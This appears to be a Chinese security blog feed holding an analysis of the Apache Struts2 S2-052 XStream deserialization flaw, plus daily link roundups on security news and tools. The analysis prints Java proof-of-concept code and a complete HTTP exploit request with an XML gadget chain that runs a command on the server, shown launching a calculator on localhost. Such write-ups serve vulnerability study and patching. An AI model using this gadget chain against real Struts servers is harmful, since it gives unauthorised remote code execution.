<h4 id="s2-052"><a href="#s2-052" class="headerlink" title="s2-052"></a>s2-052</h4><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-052" target="_blank" rel="external">官方通告</a><br>在分析这个漏洞之前，先补补基础知识。<br><br>了解一下xstream这个包，看一下官方的一句话介绍，XStream is a simple library to serialize objects to XML and back again.就是一个序列化java对象为xml以及将xml反序列化为java对象。<br><br>我之前分析过json序列化和反序列化时常用的几种方法，今天我也学习一下xml序列化和反序列化的方法，目前来说有两种，一种是XMLDecoder，另外一下是使用xstream，xstream使用的比较早的多，然后这次的s2-052就是利用的xstream。<br><br><br>xstream反序列化的问题由来已久，早在四年前，老外就在defcon中讲述了这个问题<a href="https://www.youtube.com/watch?v=L6gXSiGtoqg" target="_blank" rel="external">link</a>，而且之前jenkins的反序列化漏洞也是和xstream有关。<br><br><img src="/2017/09/17/struts-052和struts-053分析/xmlGenMain.png" alt=""><br>我们可以看到，通过XMLGenerator.generateXML的方法就进行了序列化，而通过XMLGenerator.generateTOfromXML就进行了反序列化。这个XMLGenerator类的代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public final class XMLGenerator &#123;</div><div class="line">/*</div><div class="line"> * this class is for generating XML </div><div class="line"> */</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * initialization of XStream class </div><div class="line">  */</div><div class="line"> private static XStream xstream = new XStream(new DomDriver())</div><div class="line"> &#123;&#123;</div><div class="line">  processAnnotations(Square.class);</div><div class="line">  processAnnotations(Rectangle.class);</div><div class="line"> &#125;&#125;;</div><div class="line"> </div><div class="line"> /*</div><div class="line">  * This class is for generating XML from MODEL class</div><div class="line">  * @param Object</div><div class="line">  * @return String </div><div class="line">  */</div><div class="line"> public static String generateXML(Object to) &#123;</div><div class="line">  return null == to ? &quot;&quot; : xstream.toXML(to);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> /*</div><div class="line">  * Generates the transfer object from the given XML using XStream.</div><div class="line">  * </div><div class="line">  * @param String</div><div class="line">  * @return transfer object</div><div class="line">  */</div><div class="line"> public static Object generateTOfromXML(String xml) &#123;</div><div class="line">  return xstream.fromXML(xml);</div><div class="line"> &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里就用到了XStream。<br>现在我们再来看一下这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">import com.thoughtworks.xstream.XStream;</div><div class="line">import com.thoughtworks.xstream.io.xml.DomDriver;</div><div class="line"></div><div class="line">public class xstreamPOC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;</div><div class="line">//		String payload = &quot;&lt;square&gt;&quot;+ </div><div class="line">//						 &quot;	&lt;size&gt;5&lt;/size&gt;&quot;+</div><div class="line">//						 &quot;&lt;/square&gt; &quot;;	</div><div class="line">		String payload = &quot;&lt;string&gt;&quot;+ </div><div class="line">				 		&quot;	hello&quot;+</div><div class="line">				 		 &quot;&lt;/string&gt; &quot;;</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		//Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//the next code is what the XMLGenerator.generateTOfromXML is doing:</div><div class="line">		XStream xstream = new XStream(new DomDriver())	</div><div class="line">											&#123;&#123;</div><div class="line">												processAnnotations(Square.class);</div><div class="line">												processAnnotations(Rectangle.class);</div><div class="line">											&#125;&#125;;		</div><div class="line">		Square sq1 = (Square)xstream.fromXML(inputXML);</div><div class="line">		</div><div class="line">		System.out.println(String.format(&quot;sq1: \n \n%s \n\n&quot;, sq1));</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/xstreamstring.png" alt=""><br>从上图可以看到，当我在序列化一个包含有string关键字的xml时候，他会首先产生一个string的类，然后强制转换成Square类。危险就为危险在这里了，XStream将创建定义在xml中的对象。<br><br>那么如果我们换成下面的payload呢<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">		 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">		 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/stringExec.png" alt=""><br>可以看到我们就会实例化这个ProcessBuilder这个类。但是呢，目前为止我们还是只能创建对象，并不能invoke他们，所以这个时候就需要动态代理和EventHandle这两个技巧了。<br>看下面这样的代码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import java.beans.EventHandler;</div><div class="line">import java.util.Set;</div><div class="line">import java.util.TreeSet;</div><div class="line"></div><div class="line">public class XStreamPoC &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) </div><div class="line">	&#123;		</div><div class="line">		Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();</div><div class="line">        set.add(&quot;foo&quot;);</div><div class="line"></div><div class="line">        set.add(EventHandler.create(Comparable.class, </div><div class="line">        			new ProcessBuilder(&quot;open&quot;,&quot;/Applications/Calculator.app&quot;), &quot;start&quot;));</div><div class="line">		</div><div class="line">        String setXml = XMLGenerator.generateXML(set);</div><div class="line">		/*String payload = &quot;&lt;java.lang.ProcessBuilder&gt;&quot;+ </div><div class="line">						 &quot;     &lt;command&gt;ExecuteMe&lt;/command&gt;&quot;+</div><div class="line">						 &quot;&lt;/java.lang.ProcessBuilder&gt;&quot;;		</div><div class="line">		</div><div class="line">		String inputXML = payload;</div><div class="line">		</div><div class="line">		Square sq1 = (Square)XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">		//Object sq1 = XMLGenerator.generateTOfromXML(inputXML);</div><div class="line">			</div><div class="line">		System.out.println(String.format(&quot;sq1 value: %s \n\nsq1 class: %s&quot;, sq1, sq1.getClass()));</div><div class="line">		 */</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/technique.png" alt=""><br>如上图所示，可以看到当转换发生异常的时候,就会执行start的操作。<br>介于此，我们的payload就可以这么写了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import java.io.IOException;</div><div class="line">public class PoC_XMLGenerator &#123;</div><div class="line"></div><div class="line">	public static void main(String[] args) &#123;</div><div class="line">		// TODO Auto-generated method stub</div><div class="line"></div><div class="line">		String process = &quot;open&quot;; 		</div><div class="line">		String arguments = &quot;/Applications/Calculator.app&quot;;		</div><div class="line">		</div><div class="line">		String payload = &quot;&lt;sorted-set&gt;&quot; +  </div><div class="line">						 //&quot;&lt;string&gt;foo&lt;/string&gt;&quot; +</div><div class="line">						 &quot;&lt;dynamic-proxy&gt;&quot; + </div><div class="line">						 &quot;&lt;interface&gt;java.lang.Comparable&lt;/interface&gt;&quot; +</div><div class="line">						 &quot;&lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;&quot; +</div><div class="line">						 &quot;    &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot; +</div><div class="line">						 &quot;         &lt;command&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + process + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;             &lt;string&gt;&quot; + arguments + &quot;&lt;/string&gt;&quot; +</div><div class="line">						 &quot;        &lt;/command&gt;&quot; +</div><div class="line">						 &quot;    &lt;/target&gt;&quot; +</div><div class="line">						 &quot;    &lt;action&gt;start&lt;/action&gt;&quot; +</div><div class="line">						 &quot;&lt;/handler&gt;&quot; + </div><div class="line">						 &quot;&lt;/dynamic-proxy&gt;&quot; + 						</div><div class="line">						&quot;&lt;/sorted-set&gt;&quot;;</div><div class="line">		</div><div class="line">		XMLGenerator.generateTOfromXML(payload);</div><div class="line">		</div><div class="line">		System.out.println(&quot;Will not get here&quot;);</div><div class="line"></div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>至此，XStream的利用点分析完了。下面再来看看struts2中的利用。<br><br>通过官方的一句话公告 A RCE attack is possible when using the Struts REST plugin with XStream handler to deserialise XML requests可以看出问题出在struts rest plugin，这个REST插件struts2-rest-plugin.jar用到了XStreamHandler这个类，这个类对http请求中content-type是application/xml的，会调用XStream进行处理。<br><img src="/2017/09/17/struts-052和struts-053分析/s2rest.png" alt=""><br>可以看到，当contenttype为xml的时候的处理类是XStreamHandler。那么我们就可以将恶意代码以xml为载体，通过Content-type为xml的方式，让XStreamHandler去进行序列化，那么这个时候就会触发漏洞。<br><br>最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3 HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2430</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;open&lt;/string&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure></p>
<p><img src="/2017/09/17/struts-052和struts-053分析/exp.png" alt=""></p>
<ul>
<li>补丁对比<br><a href="https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264" target="_blank" rel="external">补丁代码</a><h4 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h4></li>
<li>关于s2-053的漏洞问题是安全编码和习惯的问题,而非struts2通杀漏洞。<br><br><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="external">官方通告</a><br><img src="/2017/09/17/struts-052和struts-053分析/s2-053.png" alt=""></li>
<li>较s2-052，s2-053漏洞更简单和直接。<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
<li><del>我还是喜欢用eclipse分析java漏洞。</del>，还是好像还是idea比较好用啊，只是从eclipse切换过来略蛋疼。切换过来之后，你会发现你的ide好像都要是JetBrains这个公司的了。</li>
<li>基础还是不够牢固，给自己定个小计划，后面有时间把所有的s2漏洞分析一下。总结一下思路。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li>Standard way to serialize and deserialize Objects with XStream<br><a href="http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o" target="_blank" rel="external">http://blog.sodhanalibrary.com/2013/12/standard-way-to-serialize-and.html#.Wb6sFdMjE0o</a></li>
<li>一步一步的构造payload<br><a href="https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java" target="_blank" rel="external">https://gist.github.com/DinisCruz/8077118#file-1-poping-a-calculator-on-osx-using-xmlgenerator-xstream-based-api-java</a></li>
<li>XStream “Remote Code Execution” exploit on code from “Standard way to serialize and deserialize Objects with XStream” article<br><a href="http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1" target="_blank" rel="external">http://blog.diniscruz.com/2013/12/xstream-remote-code-execution-exploit.html?m=1</a></li>
<li>Struts2 S2-052 RCE分析与利用<br><a href="https://paper.seebug.org/383/" target="_blank" rel="external">https://paper.seebug.org/383/</a></li>
<li>CVE-2017-9805:Struts2 REST插件远程执行命令漏洞(S2-052) 分析报告<br><a href="https://yq.aliyun.com/articles/197926" target="_blank" rel="external">https://yq.aliyun.com/articles/197926</a></li>
<li>S2-052漏洞分析及官方缓解措施无效验证<br><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/</a></li>
<li>Struts2 S2-052漏洞分析<br><a href="https://www.waitalone.cn/struts2-s2-052.html" target="_blank" rel="external">https://www.waitalone.cn/struts2-s2-052.html</a></li>
<li>Struts2-052漏洞分析<br><a href="https://yaofeifly.github.io/2017/09/08/Struts2-052/" target="_blank" rel="external">https://yaofeifly.github.io/2017/09/08/Struts2-052/</a></li>
<li>Apache Struts2 Remote Code Execution (S2-053)<br><a href="http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/" target="_blank" rel="external">http://reverse-tcp.xyz/2017/09/15/Apache-Struts2-remote-code-execution-(s2-053)/</a></li>
<li>S2-053 复现分析过程(附POC)<br><a href="https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA</a></li>
<li>Struts 2 S2-053漏洞分析（附POC）<br><a href="http://www.freebuf.com/vuls/147735.html" target="_blank" rel="external">http://www.freebuf.com/vuls/147735.html</a></li>
<li>来自McAfee对s2-052的分析<br><a href="https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/" target="_blank" rel="external">https://securingtomorrow.mcafee.com/mcafee-labs/apache-struts-at-rest-analyzing-remote-code-execution-vulnerability-cve-2017-9805/</a></li>
<li>GCC 合并了我写的代码，从编译器开始解决安全问题。来自嘶吼，作者为吴潍浠<br><a href="http://www.4hou.com/binary/7688.html" target="_blank" rel="external">http://www.4hou.com/binary/7688.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。&lt;/p&gt;
&lt;h4 id=&quot;s2-052&quot;&gt;&lt;a href=&quot;#s2-
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170917安全动态</title>
    <link href="http://kevien.github.io/2017/09/17/20170917%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/17/20170917安全动态/</id>
    <published>2017-09-17T05:06:48.000Z</published>
    <updated>2017-09-17T08:10:52.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>逆向英雄联盟客户端<br><a href="https://nickcano.com/reversing-league-of-legends-client/" target="_blank" rel="external">https://nickcano.com/reversing-league-of-legends-client/</a></li>
<li>通过Chrome DLL劫持藏在广告软件包中的盗密码后门<br><a href="https://www.bleepingcomputer.com/news/security/adware-installs-infostealer-trojan-that-it-loads-via-chrome-dll-hijacking/" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/adware-installs-infostealer-trojan-that-it-loads-via-chrome-dll-hijacking/</a></li>
<li>后渗透框架RemoteRecon<br><a href="https://github.com/xorrior/RemoteRecon" target="_blank" rel="external">https://github.com/xorrior/RemoteRecon</a></li>
<li>D-Link DIR8xx Routers多个漏洞<br>本地固件上传：<a href="https://www.exploit-db.com/exploits/42731/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42731/</a><br>登录凭证泄露：<a href="https://www.exploit-db.com/exploits/42729/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42729/</a><br>ROOT权限远程代码执行：<a href="https://www.exploit-db.com/exploits/42730/" target="_blank" rel="external">https://www.exploit-db.com/exploits/42730/</a> </li>
<li>Debug Cisco ASA Tools<br><https: github.com="" nccgroup="" asatools=""></https:></li>
<li>检测Mimikatz及其他可疑LSASS访问<br><a href="https://www.eideon.com/2017-09-09-THL01-Mimikatz/" target="_blank" rel="external">https://www.eideon.com/2017-09-09-THL01-Mimikatz/</a></li>
<li>安全专家研究发现PyPI一直在托管恶意软件库<br><a href="https://www.theregister.co.uk/2017/09/15/pretend_python_packages_prey_on_poor_typing/" target="_blank" rel="external">https://www.theregister.co.uk/2017/09/15/pretend_python_packages_prey_on_poor_typing/</a></li>
<li>JS中的危险函数（Part 1）<br><a href="http://blog.blueclosure.com/2017/09/javascript-dangerous-functions-part-1.html" target="_blank" rel="external">http://blog.blueclosure.com/2017/09/javascript-dangerous-functions-part-1.html</a></li>
<li>成为网络中的幽灵<br><a href="https://github.com/cryptolok/GhostInTheNet" target="_blank" rel="external">https://github.com/cryptolok/GhostInTheNet</a></li>
<li>学会利用HTTP PUT<br><a href="http://www.hackingtutorials.org/exploit-tutorials/metasploitable-3-exploiting-http-put/" target="_blank" rel="external">http://www.hackingtutorials.org/exploit-tutorials/metasploitable-3-exploiting-http-put/</a></li>
<li>Code Audit Challenges 代码审计练习题<br><a href="https://github.com/CHYbeta/Code-Audit-Challenges" target="_blank" rel="external">https://github.com/CHYbeta/Code-Audit-Challenges</a></li>
<li>比敌人更了解敌人 [ 取证入门 web篇 ]<br><a href="http://www.freebuf.com/column/147929.html" target="_blank" rel="external">http://www.freebuf.com/column/147929.html</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>最近觉得shadowsocks代理打开被强的网站速度很慢，修改了一下加密方式由aes-256-cfb改为了aes-128-cfb后速度快了好多。虽然安全性稍微差了点儿。。</li>
<li>tcpdump使用<br>有时候再没有安装类似wireshark的环境下，可能就需要用到tcpdump来进行抓包。<br><br>命令支持的参数比较的多，而且提供了and ，or，not等逻辑关键词来进行流量的筛选和过滤，用的时候 man一下会用就可以了，几个点需要注意一下，就是<br>-i  主机有一个网卡还好，如果多个网卡的话，就必须要-i 指定要抓取流量的网卡<br><br>其它常用过滤关键词 src dst host 等<br><img src="/2017/09/17/20170917安全动态/tcpdump.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;逆向英雄联盟客户端&lt;br&gt;&lt;a href=&quot;https://nickcano.com/rever
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170915安全动态</title>
    <link href="http://kevien.github.io/2017/09/15/20170915%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/15/20170915安全动态/</id>
    <published>2017-09-15T02:19:51.000Z</published>
    <updated>2017-09-15T10:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>Windows for Linux Nerds<br><a href="https://blog.jessfraz.com/post/windows-for-linux-nerds/" target="_blank" rel="external">https://blog.jessfraz.com/post/windows-for-linux-nerds/</a></li>
<li>30 个有趣的 Linux Shell 命令<br><a href="https://www.lopezferrando.com/30-interesting-shell-commands/" target="_blank" rel="external">https://www.lopezferrando.com/30-interesting-shell-commands/</a></li>
<li>【干货分享】XSS攻击进阶篇——那些年我们看不懂的XSS<br><a href="http://blog.nsfocus.net/xss-advance/" target="_blank" rel="external">http://blog.nsfocus.net/xss-advance/</a></li>
<li>Radare 2之旅：通过crackme实例讲解Radare 2在逆向中的应用（上）<br><a href="http://bobao.360.cn/learning/detail/4400.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4400.html</a></li>
<li>妙用JavaScript绕过XSS过滤<br><a href="http://bobao.360.cn/learning/detail/4414.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4414.html</a></li>
<li><p>从SQL注入到管理员权限<br><a href="https://www.notsosecure.com/anatomy-of-a-hack-sqli-to-enterprise-admin/" target="_blank" rel="external">https://www.notsosecure.com/anatomy-of-a-hack-sqli-to-enterprise-admin/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">感觉渗透外国人的思路还是不错</div></pre></td></tr></table></figure>
</li>
<li><p>Windbg-Cheat-Sheet<br><a href="https://github.com/bulentrahimkazanci/Windbg-Cheat-Sheet" target="_blank" rel="external">https://github.com/bulentrahimkazanci/Windbg-Cheat-Sheet</a></p>
</li>
<li>free open-source macOS firewall<br><a href="https://github.com/objective-see/LuLu" target="_blank" rel="external">https://github.com/objective-see/LuLu</a></li>
<li>CVE-2017-0213: Windows COM权限提升漏洞<br><a href="https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213" target="_blank" rel="external">https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213</a></li>
<li>REST API Security Testing with Acunetix<br><https: www.acunetix.com="" blog="" articles="" rest-api-security-testing-acunetix=""></https:></li>
<li>又一个web扫描器  Spaghetti<br><a href="https://github.com/m4ll0k/Spaghetti" target="_blank" rel="external">https://github.com/m4ll0k/Spaghetti</a></li>
<li>Ansible Vault、Tablib YAML解析器原创代码执行漏洞<br><a href="http://blog.talosintelligence.com/2017/09/vulnerability-spotlight-yaml-remote.html" target="_blank" rel="external">http://blog.talosintelligence.com/2017/09/vulnerability-spotlight-yaml-remote.html</a></li>
<li>小心Bashware：恶意软件绕过杀软的新思路,这种方法利用 Windows 10 新支持的 WSL（Linux 子系统）特性可以 Bypass 现有杀软的检测防护体系<br><a href="https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/" target="_blank" rel="external">https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/</a></li>
<li>Luckystrike：恶意office文档生成器<br><a href="https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator" target="_blank" rel="external">https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator</a></li>
